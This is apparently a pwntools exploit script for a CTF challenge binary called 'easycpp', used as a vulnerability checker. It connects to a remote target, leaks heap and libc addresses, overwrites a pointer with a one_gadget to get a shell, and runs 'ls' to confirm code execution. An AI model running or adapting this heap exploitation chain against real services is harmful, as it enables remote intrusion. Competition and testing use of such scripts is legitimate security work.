from pwn import *
#p=process("./easycpp")
ip=sys.argv[1]
port=sys.argv[2]
p=remote(ip,port)
def add(content):
	p.recvuntil(">> ")
	p.sendline("1")
	p.sendlineafter("Do you want to clear it?(y/N)\n","N")
	p.sendlineafter("content(q to quit):\n",content)

p.recvuntil(">> ")
p.sendline("3")
p.recvuntil(">> ")
p.sendline("5")

add('a'*0x68+'q')
p.recvuntil(">> ")
p.sendline("2")

add('a'*0x68+'q')
p.recvuntil(">> ")
p.sendline("2")

add('a'*0x68+'q')
add('a'*0x68+'q')
add('b'*0x1+'q')

p.recvuntil(">> ")
p.sendline("6")
p.recvuntil("b")
addr=p.recvuntil("\n",drop='true')
heap_addr=u64(addr.ljust(8,'\x00'))*0x100-0x270+0x8

add('c'*23+'q')

p.recvuntil(">> ")
p.sendline("6")
p.recvuntil("ccccccccccccccccccccccc")
addr=p.recvuntil("\n",drop='true')
libc_addr=u64(addr.ljust(8,'\x00'))-0x970e0
one=libc_addr+0x10a45c

p.recvuntil(">> ")
p.sendline("1")
p.sendlineafter("Do you want to clear it?(y/N)\n","y")
p.sendlineafter("content(q to quit):\n",p64(heap_addr)+p64(one)+'q')

p.recvuntil(">> ")
p.sendline("4")
#print hex(heap_addr)
#print hex(libc_addr)
p.sendline("ls")
string=p.recv(40)
p.close()
if "easycpp" not in string:
	print ('(0, noVulns)')
else:
	print ('(1, Vulns)')
#gdb.attach(p)


